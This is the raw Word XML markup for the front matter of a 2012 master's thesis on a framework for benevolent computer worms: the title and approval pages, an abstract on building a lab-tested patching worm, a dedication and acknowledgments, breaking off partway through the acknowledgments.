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D2E" w:rsidRPr="00290197" w:rsidRDefault="00CB26A3" w:rsidP="00290197">
      <w:pPr>
        <w:pStyle w:val="ThesisTitle"/>
      </w:pPr>
      <w:r w:rsidRPr="00290197">
        <w:t>A Framework for Benevolent</w:t>
      </w:r>
      <w:r w:rsidR="00861880" w:rsidRPr="00290197">
        <w:t xml:space="preserve"> Computer</w:t>
      </w:r>
      <w:r w:rsidRPr="00290197">
        <w:t xml:space="preserve"> Worms</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by</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Rodney Beede</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B.S., University of Oklahoma, 2007</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00861880" w:rsidRDefault="00861880" w:rsidP="00861880">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00861880" w:rsidRDefault="00861880" w:rsidP="00861880">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pP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A thesis submitted to the</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Faculty of the Graduate School of the</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University of Colorado in partial fulfillment</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of the requirement for the degree of</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Master of Science</w:t>
      </w:r>
    </w:p>
    <w:p w:rsid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861880" w:rsidRPr="00861880" w:rsidRDefault="00861880" w:rsidP="00861880">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>2012</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00861880" w:rsidRDefault="00861880" w:rsidP="00ED34CE">
      <w:pPr>
        <w:spacing w:after="0" w:line="480" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:sectPr w:rsidR="00861880" w:rsidSect="0089091D">
          <w:headerReference w:type="default" r:id="rId8"/>
          <w:pgSz w:w="12240" w:h="15840" w:code="1"/>
          <w:pgMar w:top="1440" w:right="1440" w:bottom="1440" w:left="1440" w:header="706" w:footer="706" w:gutter="0"/>
          <w:cols w:space="708"/>
          <w:vAlign w:val="center"/>
          <w:titlePg/>
          <w:docGrid w:linePitch="360"/>
        </w:sectPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00B05ADD" w:rsidRDefault="00B05ADD" w:rsidP="00B05ADD">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This thesis entitled:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B05ADD" w:rsidRDefault="00B05ADD" w:rsidP="00B05ADD">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>A Framework for Benevolent</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> Computer</w:t>
      </w:r>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> Worms</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B05ADD" w:rsidRDefault="00B05ADD" w:rsidP="00B05ADD">
      <w:pPr>
        <w:spacing w:after="0" w:line="480" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B05ADD">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>written by Rodney Beede</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B05ADD" w:rsidRDefault="00B05ADD" w:rsidP="00B05ADD">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has been approved for the Department of Computer Science</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B05ADD" w:rsidRDefault="00B05ADD" w:rsidP="00B05ADD">
      <w:pPr>
        <w:spacing w:after="0" w:line="480" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00B05ADD" w:rsidRDefault="00B05ADD" w:rsidP="00B05ADD">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w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:br/>
        <w:t>(Richard Han)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B05ADD" w:rsidRDefault="00B05ADD" w:rsidP="00B05ADD">
      <w:pPr>
        <w:spacing w:after="0" w:line="480" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00B05ADD" w:rsidRDefault="00B05ADD" w:rsidP="00B05ADD">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w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:br/>
        <w:t>(Kenneth Anderson)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B05ADD" w:rsidRDefault="00B05ADD" w:rsidP="00B05ADD">
      <w:pPr>
        <w:spacing w:after="0" w:line="480" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00B05ADD" w:rsidRDefault="00B05ADD" w:rsidP="00B05ADD">
      <w:pPr>
        <w:spacing w:after="0" w:line="480" w:lineRule="auto"/>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Date:</w:t>
      </w:r>
      <w:r w:rsidRPr="00B05ADD">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t xml:space="preserve">  April 19, 201</w:t>
      </w:r>
      <w:r w:rsidRPr="007F71C8">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t>2</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B05ADD" w:rsidRDefault="00B05ADD" w:rsidP="00B05ADD">
      <w:pPr>
        <w:spacing w:after="0" w:line="480" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00B05ADD" w:rsidRPr="00B05ADD" w:rsidRDefault="00B05ADD" w:rsidP="00B05ADD">
      <w:pPr>
        <w:spacing w:after="0" w:line="480" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B05ADD">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>The final copy of this thesis has been examined by the signatories, and we</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B05ADD" w:rsidRPr="00B05ADD" w:rsidRDefault="00B05ADD" w:rsidP="00B05ADD">
      <w:pPr>
        <w:spacing w:after="0" w:line="480" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B05ADD">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Find that both the content and the form meet acceptable presentation standards</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00511D2E" w:rsidRPr="00B05ADD" w:rsidRDefault="00B05ADD" w:rsidP="00B05ADD">
      <w:pPr>
        <w:spacing w:after="0" w:line="480" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B05ADD">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Of scholarly work in the above mentioned discipline</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B05ADD" w:rsidRDefault="00B05ADD" w:rsidP="00ED34CE">
      <w:pPr>
        <w:spacing w:after="0" w:line="480" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:sectPr w:rsidR="00B05ADD" w:rsidSect="0089091D">
          <w:pgSz w:w="12240" w:h="15840"/>
          <w:pgMar w:top="1440" w:right="1440" w:bottom="1440" w:left="1440" w:header="706" w:footer="706" w:gutter="0"/>
          <w:cols w:space="708"/>
          <w:vAlign w:val="center"/>
          <w:titlePg/>
          <w:docGrid w:linePitch="360"/>
        </w:sectPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00B679AB" w:rsidRPr="00B679AB" w:rsidRDefault="00B679AB" w:rsidP="00B63226">
      <w:pPr>
        <w:pStyle w:val="TH1"/>
      </w:pPr>
      <w:bookmarkStart w:id="0" w:name="_Toc321736772"/>
      <w:r w:rsidRPr="00B679AB">
        <w:lastRenderedPageBreak/>
        <w:t>Abstract</w:t>
      </w:r>
      <w:bookmarkEnd w:id="0"/>
    </w:p>
    <w:p w:rsidR="00B63226" w:rsidRDefault="00B679AB" w:rsidP="00B63226">
      <w:pPr>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Beede, Rodney David (M.S., Computer Science)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B679AB" w:rsidRDefault="00B679AB" w:rsidP="00B63226">
      <w:pPr>
        <w:spacing w:after="240" w:line="480" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>A Framework for Benevolent</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> Computer</w:t>
      </w:r>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> Worms</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B679AB" w:rsidRDefault="00B679AB" w:rsidP="00B63226">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Thesis directed by Associate Professor Richard Y. Han</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B63226" w:rsidRDefault="00B63226" w:rsidP="00B63226">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="0089091D" w:rsidRPr="0069690B" w:rsidRDefault="00B679AB" w:rsidP="00533849">
      <w:pPr>
        <w:spacing w:line="480" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:sectPr w:rsidR="0089091D" w:rsidRPr="0069690B" w:rsidSect="00332E5B">
          <w:pgSz w:w="12240" w:h="15840"/>
          <w:pgMar w:top="1440" w:right="1440" w:bottom="1440" w:left="1440" w:header="706" w:footer="706" w:gutter="0"/>
          <w:pgNumType w:fmt="lowerRoman"/>
          <w:cols w:space="708"/>
          <w:docGrid w:linePitch="360"/>
        </w:sectPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r w:rsidR="0069690B">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>The objective of this research was to discover and define the characteristics a benevolent computer worm would have in order to help mitigate or reduce the risks of using such a tool to combat against computer security threats.  Analysis of prominent malicious and benevolent computer worms were studied as well as the ethical and legal aspects of benevolent worms.  A set of desired characteristics for a benevolent worm</w:t>
      </w:r>
      <w:r w:rsidR="00533849">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> framework</w:t>
      </w:r>
      <w:r w:rsidR="0069690B">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> as well as how those characteristics help to mitigate risk was developed.  A benevolent worm was created and tested in an environment with exploitable </w:t>
      </w:r>
      <w:r w:rsidR="00533849">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>systems</w:t>
      </w:r>
      <w:r w:rsidR="0069690B">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> to demonstrate the feasibility of using a benevolent worm to patch and protect systems without causing excessive consumption of network resources.  The conclusion reached was that </w:t>
      </w:r>
      <w:r w:rsidR="002172F1">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>it was feasible to construct a benevolent worm such that the benefits to the community (or network) as a whole in securing</w:t>
      </w:r>
      <w:r w:rsidR="00533849">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> it</w:t>
      </w:r>
      <w:r w:rsidR="002172F1">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> outweighed the risks</w:t>
      </w:r>
      <w:r w:rsidR="00533849">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00380137" w:rsidRPr="00332E5B" w:rsidRDefault="00380137" w:rsidP="00332E5B">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00332E5B">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Dedication</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00015EB8" w:rsidRDefault="00380137" w:rsidP="00B63226">
      <w:pPr>
        <w:spacing w:after="0" w:line="480" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:sectPr w:rsidR="00015EB8" w:rsidSect="00B05ADD">
          <w:headerReference w:type="default" r:id="rId9"/>
          <w:pgSz w:w="12240" w:h="15840"/>
          <w:pgMar w:top="1440" w:right="1440" w:bottom="1440" w:left="1440" w:header="706" w:footer="706" w:gutter="0"/>
          <w:cols w:space="708"/>
          <w:docGrid w:linePitch="360"/>
        </w:sectPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r w:rsidR="00DA513E" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Dedicated to my wonderful wife </w:t>
      </w:r>
      <w:r w:rsidR="00DA513E" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">for her </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">kind </w:t>
      </w:r>
      <w:r w:rsidR="00DA513E" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>support and patience without whom I could not have accomplished this work.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00861880" w:rsidRDefault="00CB26A3" w:rsidP="00AA1CEA">
      <w:pPr>
        <w:pStyle w:val="TH1"/>
      </w:pPr>
      <w:bookmarkStart w:id="1" w:name="_Toc321736773"/>
      <w:r w:rsidRPr="00861880">
        <w:lastRenderedPageBreak/>
        <w:t>Acknowledgments</w:t>
      </w:r>
      <w:bookmarkEnd w:id="1"/>
    </w:p>
    <w:p w:rsidR="00AA1CEA" w:rsidRPr="00AA1CEA"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sidRPr="00AA1CEA">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Cisco Systems </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>for providing</w:t>
      </w:r>
      <w:r w:rsidRPr="00AA1CEA">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> servers and network hardware to enable me to do my research.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00DD1E76" w:rsidRPr="00AA1CEA"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MSDNAA program for providing </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00AA1CEA">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>software license</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>s for testing with the Microsoft Windows operating system.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="007C1107" w:rsidRPr="00AA1CEA" w:rsidRDefault="007C1107" w:rsidP="007C1107">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1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ProxMox</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00AA1CEA">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>for their free clustering virtualization software.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00AA1CEA"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Rapid 7 for their </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00AA1CEA">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Metasploit</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> software</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00AA1C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provided an</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00AA1CEA">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> excellent</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00AA1CEA">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>exploit framework</w:t>
      </w:r>
      <w:r w:rsidR="007C1107">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00AA1CEA" w:rsidRDefault="007C1107" w:rsidP="00AA1CEA">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="16"/>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VMWare</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00AA1CEA">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">for their free </w:t>
      </w:r>
      <w:r w:rsidR="000150D5">
        <w:rPr>
